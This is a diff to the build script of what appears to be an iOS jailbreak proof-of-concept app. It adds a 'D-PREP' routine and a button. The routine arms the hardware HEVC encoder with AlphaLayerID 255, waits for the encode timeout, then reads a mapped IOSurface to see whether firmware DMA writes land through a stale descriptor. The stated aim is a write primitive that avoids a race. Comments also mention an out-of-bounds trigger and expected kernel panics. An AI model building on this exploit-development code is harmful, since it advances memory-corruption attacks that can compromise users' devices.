@@ -151,6 +151,7 @@ cat > "$WORK/main.m" << 'OBJC'
 #import <VideoToolbox/VideoToolbox.h>
 #import <CoreMedia/CoreMedia.h>
 #import <AVFoundation/AVFoundation.h>
+#import <IOSurface/IOSurface.h>
 #include <IOKit/IOKitLib.h>
 #include <mach/mach.h>
 #include <unistd.h>
@@ -3215,6 +3216,315 @@ static void runRunC2(void) {
 }
 
 // ============================================================
+// D-PREP: In-place readout — test Model (b)
+//
+// Model (b): firmware writes through the stale descriptor CONTINUOUSLY
+// while the PTE is valid. We just haven't looked. The panic only appears
+// at teardown because that's when the mapping goes away.
+//
+// Test: arm Alpha=255, keep session alive, snapshot the input pixel
+// buffer + any output surfaces, then re-read at intervals through the
+// ~160s idle-timer window. If any bytes change → firmware DMA is already
+// writing into our mapped surfaces. No race needed.
+// ============================================================
+
+static void runDPrep(void) {
+    if (g_phase2Running) {
+        INFO(@"Phase 2 test already running — wait for it.");
+        return;
+    }
+    g_phase2Running = YES;
+
+    os_log_t dLog = os_log_create("com.jbpoc.dprep", "readout");
+
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════════╗");
+    pocLog(@"║  D-PREP: In-Place Surface Readout         ║");
+    pocLog(@"║  Model (b) test — is firmware already     ║");
+    pocLog(@"║  writing into our mapped surfaces?        ║");
+    pocLog(@"║  Safe: reads only, keeps session alive    ║");
+    pocLog(@"║  *** MAY PANIC at ~160s (idle timer) ***  ║");
+    pocLog(@"╚══════════════════════════════════════════╝");
+    pocLog(@"");
+
+    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
+    fmt.dateFormat = @"HH:mm:ss.SSS";
+
+    // Step 1: Canary
+    LOG(@"--- STEP 1: CANARY ---");
+    os_log(dLog, "JBPoC-DPREP-CANARY-START");
+    BOOL canary = phase2Encode(0, @"CANARY");
+    if (!canary) {
+        FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
+        g_phase2Running = NO;
+        return;
+    }
+    PASS(@"CANARY OK.");
+    idleWait(5, @"canary cooldown");
+
+    // Step 2: Create the input pixel buffer — this is the surface the firmware sees
+    LOG(@"--- STEP 2: CREATE SURFACES & SNAPSHOT ---");
+    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
+    if (!pb) {
+        FAIL(@"Pixel buffer creation failed");
+        g_phase2Running = NO;
+        return;
+    }
+
+    // Snapshot the input surface BEFORE arming
+    CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+    size_t yH = CVPixelBufferGetHeightOfPlane(pb, 0);
+    size_t yBpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 0);
+    size_t ySize = yH * yBpr;
+    size_t uvH = CVPixelBufferGetHeightOfPlane(pb, 1);
+    size_t uvBpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 1);
+    size_t uvSize = uvH * uvBpr;
+    size_t totalSize = ySize + uvSize;
+
+    uint8_t *yBase = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+    uint8_t *uvBase = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+
+    uint8_t *snapshot = (uint8_t *)malloc(totalSize);
+    if (!snapshot) {
+        FAIL(@"malloc snapshot failed");
+        CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+        CVPixelBufferRelease(pb);
+        g_phase2Running = NO;
+        return;
+    }
+    memcpy(snapshot, yBase, ySize);
+    memcpy(snapshot + ySize, uvBase, uvSize);
+    CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+
+    INFO(@"Input surface: Y %zux%zu (%zu bytes, bpr=%zu) + UV %zux%zu (%zu bytes, bpr=%zu)",
+         CVPixelBufferGetWidthOfPlane(pb, 0), yH, ySize, yBpr,
+         CVPixelBufferGetWidthOfPlane(pb, 1), uvH, uvSize, uvBpr);
+    INFO(@"Total snapshot: %zu bytes (0x%zx)", totalSize, totalSize);
+    os_log(dLog, "JBPoC-DPREP-SNAPSHOT total=%zu ySize=%zu uvSize=%zu", totalSize, ySize, uvSize);
+
+    // Compute initial CRC32 for quick comparison
+    uint32_t initCrcY = 0;
+    for (size_t i = 0; i < ySize; i++) initCrcY = (initCrcY << 1) ^ snapshot[i];
+    uint32_t initCrcUV = 0;
+    for (size_t i = 0; i < uvSize; i++) initCrcUV = (initCrcUV << 1) ^ snapshot[ySize + i];
+    INFO(@"Initial checksums: Y=0x%08x UV=0x%08x", initCrcY, initCrcUV);
+
+    // Also get the IOSurface backing info
+    IOSurfaceRef iosurf = CVPixelBufferGetIOSurface(pb);
+    if (iosurf) {
+        uint32_t surfID = IOSurfaceGetID(iosurf);
+        size_t allocSize = IOSurfaceGetAllocSize(iosurf);
+        size_t planeCount = IOSurfaceGetPlaneCount(iosurf);
+        INFO(@"IOSurface ID=%u allocSize=%zu planes=%zu", surfID, allocSize, planeCount);
+        os_log(dLog, "JBPoC-DPREP-IOSURFACE id=%u alloc=%zu planes=%zu", surfID, allocSize, planeCount);
+    } else {
+        INFO(@"WARNING: No IOSurface backing — CVPixelBuffer not IOSurface-backed?");
+    }
+
+    // Step 3: ARM — create session with Alpha=255, submit encode, keep session alive
+    LOG(@"--- STEP 3: ARM Alpha=255 ---");
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    VTCompressionSessionRef session = NULL;
+    OSStatus status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        narrowCallback, NULL, &session);
+
+    if (status != noErr) {
+        FAIL(@"Session creation failed: %d", (int)status);
+        free(snapshot);
+        CVPixelBufferRelease(pb);
+        g_phase2Running = NO;
+        return;
+    }
+
+    status = VTSessionSetProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        (__bridge CFTypeRef)@(255));
+    INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");
+
+    status = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (status != noErr) {
+        FAIL(@"PrepareToEncode failed: %d", (int)status);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        free(snapshot);
+        CVPixelBufferRelease(pb);
+        g_phase2Running = NO;
+        return;
+    }
+
+    g_narrowGotOutput = NO;
+    g_oracleContext = @"dprep-arm";
+
+    NSString *armTime = [fmt stringFromDate:[NSDate date]];
+    LOG(@"ARM time: %@", armTime);
+    os_log(dLog, "JBPoC-DPREP-ARM %{public}@", armTime);
+
+    status = VTCompressionSessionEncodeFrame(session, pb,
+        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+    INFO(@"EncodeFrame: %d (%s)", (int)status,
+        status == noErr ? "submitted" : "error");
+
+    // Wait for the encode timeout callback (-17691)
+    LOG(@"Waiting for -17691 encode timeout (up to 130s)...");
+    for (int w = 0; w < 130; w++) {
+        [NSThread sleepForTimeInterval:1.0];
+        if (g_narrowGotOutput) break;
+        if (w > 0 && w % 30 == 0) {
+            INFO(@"Still waiting for callback... T+%ds", w);
+        }
+    }
+
+    BOOL armed = !g_narrowGotOutput;
+    INFO(@"Armed: %@ (-17691 = YES)", armed ? @"YES" : @"NO");
+    os_log(dLog, "JBPoC-DPREP-ARMED %{public}@", armed ? @"YES" : @"NO");
+
+    if (!armed) {
+        INFO(@"WARNING: Got output (no -17691). Continuing readout anyway.");
+    }
+
+    // Step 4: READOUT LOOP — scan surfaces every 5s for changes
+    LOG(@"--- STEP 4: READOUT LOOP (180s, every 5s) ---");
+    LOG(@"Watching for firmware DMA writes into mapped surfaces...");
+    os_log(dLog, "JBPoC-DPREP-READOUT-START");
+    pocLog(@"");
+
+    int hitCount = 0;
+    int firstHitTime = -1;
+
+    for (int tick = 1; tick <= 36; tick++) {  // 36 * 5s = 180s
+        [NSThread sleepForTimeInterval:5.0];
+
+        int elapsed = tick * 5;
+        NSString *now = [fmt stringFromDate:[NSDate date]];
+
+        // Re-read the pixel buffer
+        CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+        uint8_t *curY = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+        uint8_t *curUV = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+
+        // Diff Y plane
+        int yDiffs = 0;
+        int firstYOff = -1;
+        uint8_t firstYOld = 0, firstYNew = 0;
+        for (size_t i = 0; i < ySize; i++) {
+            if (curY[i] != snapshot[i]) {
+                if (yDiffs == 0) {
+                    firstYOff = (int)i;
+                    firstYOld = snapshot[i];
+                    firstYNew = curY[i];
+                }
+                yDiffs++;
+            }
+        }
+
+        // Diff UV plane
+        int uvDiffs = 0;
+        int firstUVOff = -1;
+        uint8_t firstUVOld = 0, firstUVNew = 0;
+        for (size_t i = 0; i < uvSize; i++) {
+            if (curUV[i] != snapshot[ySize + i]) {
+                if (uvDiffs == 0) {
+                    firstUVOff = (int)i;
+                    firstUVOld = snapshot[ySize + i];
+                    firstUVNew = curUV[i];
+                }
+                uvDiffs++;
+            }
+        }
+
+        CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+
+        if (yDiffs > 0 || uvDiffs > 0) {
+            hitCount++;
+            if (firstHitTime < 0) firstHitTime = elapsed;
+
+            PASS(@"*** HIT at T+%ds (%@) ***", elapsed, now);
+            if (yDiffs > 0) {
+                LOG(@"  Y plane: %d bytes changed, first at offset 0x%x (0x%02x→0x%02x)",
+                    yDiffs, firstYOff, firstYOld, firstYNew);
+            }
+            if (uvDiffs > 0) {
+                LOG(@"  UV plane: %d bytes changed, first at offset 0x%x (0x%02x→0x%02x)",
+                    uvDiffs, firstUVOff, firstUVOld, firstUVNew);
+            }
+            os_log(dLog, "JBPoC-DPREP-HIT T+%ds yDiff=%d uvDiff=%d firstY=0x%x firstUV=0x%x",
+                   elapsed, yDiffs, uvDiffs, firstYOff, firstUVOff);
+
+            // Dump first 64 changed bytes for analysis
+            if (yDiffs > 0) {
+                CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+                uint8_t *dumpY = (uint8_t *)CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+                NSMutableString *hex = [NSMutableString string];
+                int dumped = 0;
+                for (size_t i = (size_t)firstYOff; i < ySize && dumped < 64; i++) {
+                    if (dumpY[i] != snapshot[i]) {
+                        [hex appendFormat:@"%04zx:%02x→%02x ", i, snapshot[i], dumpY[i]];
+                        dumped++;
+                    }
+                }
+                CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+                LOG(@"  Y diff dump: %@", hex);
+            }
+
+            // Update snapshot to track incremental changes
+            CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+            memcpy(snapshot, CVPixelBufferGetBaseAddressOfPlane(pb, 0), ySize);
+            memcpy(snapshot + ySize, CVPixelBufferGetBaseAddressOfPlane(pb, 1), uvSize);
+            CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
+
+        } else {
+            if (elapsed <= 30 || elapsed % 30 == 0) {
+                INFO(@"T+%03ds (%@): no change", elapsed, now);
+            }
+        }
+    }
+
+    // Step 5: Summary
+    pocLog(@"");
+    LOG(@"═══════════════════════════════════════════");
+    if (hitCount > 0) {
+        PASS(@"*** MODEL (b) CONFIRMED ***");
+        LOG(@"Firmware DMA writes detected in mapped surface!");
+        LOG(@"Total readout hits: %d, first at T+%ds", hitCount, firstHitTime);
+        LOG(@"The write is ALREADY landing — no race needed.");
+        LOG(@"The panic at ~160s is just the mapping going away.");
+        os_log(dLog, "JBPoC-DPREP-RESULT MODEL_B_CONFIRMED hits=%d firstAt=%d", hitCount, firstHitTime);
+    } else {
+        INFO(@"No surface changes detected in 180s.");
+        INFO(@"Model (a) likely: write is deferred, not continuous.");
+        INFO(@"Proceed to D-proper (re-claim race).");
+        os_log(dLog, "JBPoC-DPREP-RESULT NO_HITS model_a_likely");
+    }
+    LOG(@"═══════════════════════════════════════════");
+
+    // Write results to file
+    NSString *resultStr = [NSString stringWithFormat:
+        @"D-PREP RESULT\nDate: %@\nARM: %@\nArmed: %@\nHits: %d\nFirst hit: T+%ds\nModel: %@\n",
+        [NSDate date], armTime, armed ? @"YES" : @"NO",
+        hitCount, firstHitTime,
+        hitCount > 0 ? @"(b) continuous" : @"(a) deferred"];
+    NSString *resultPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/dprep_result.txt"];
+    [resultStr writeToFile:resultPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
+    INFO(@"Results written to %@", resultPath);
+
+    // Clean up — invalidate to prevent the idle-timer panic
+    LOG(@"Invalidating session to prevent idle-timer panic...");
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+    free(snapshot);
+    CVPixelBufferRelease(pb);
+    g_phase2Running = NO;
+
+    PASS(@"D-PREP complete. Phone should stay up (session invalidated).");
+}
+
+// ============================================================
 // Tier 1b: OOB trigger — ONLY for properties verified by oracle
 // ============================================================
 
@@ -3751,7 +4061,22 @@ static void runTier2Probe(void) {
     [runCAltBtn addTarget:self action:@selector(runRunC2) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:runCAltBtn];
 
-    CGFloat logTop = row8 + btnH + gap;
+    // D-prep button — row 9: in-place surface readout (Model b test)
+    CGFloat row9 = row8 + btnH + gap;
+
+    UIButton *dPrepBtn = [UIButton buttonWithType:UIButtonTypeSystem];
+    dPrepBtn.frame = CGRectMake(pad, row9, w - pad * 2, btnH);
+    dPrepBtn.backgroundColor = [UIColor colorWithRed:0.0 green:0.3 blue:0.5 alpha:1];
+    dPrepBtn.layer.cornerRadius = 8;
+    dPrepBtn.layer.borderWidth = 2;
+    dPrepBtn.layer.borderColor = [UIColor colorWithRed:0.0 green:0.8 blue:1.0 alpha:1].CGColor;
+    dPrepBtn.titleLabel.font = [UIFont boldSystemFontOfSize:13];
+    [dPrepBtn setTitle:@"D-Prep: Surface Readout (Model b)" forState:UIControlStateNormal];
+    [dPrepBtn setTitleColor:[UIColor colorWithRed:0.0 green:0.8 blue:1.0 alpha:1] forState:UIControlStateNormal];
+    [dPrepBtn addTarget:self action:@selector(runDPrep) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:dPrepBtn];
+
+    CGFloat logTop = row9 + btnH + gap;
     self.logView = [[UITextView alloc] initWithFrame:
         CGRectMake(0, logTop, w, self.view.bounds.size.height - logTop)];
     self.logView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
@@ -3872,6 +4197,12 @@ static void runTier2Probe(void) {
     });
 }
 
+- (void)runDPrep {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runDPrep();
+    });
+}
+
 - (void)runRunC2 {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runRunC2();
@@ -3912,6 +4243,7 @@ echo "[3/6] Compiling for arm64 (iPhone)..."
     -framework CoreMedia \
     -framework CoreVideo \
     -framework AVFoundation \
+    -framework IOSurface \
     -framework IOKit \
     -fobjc-arc \
     -Wno-deprecated-declarations \
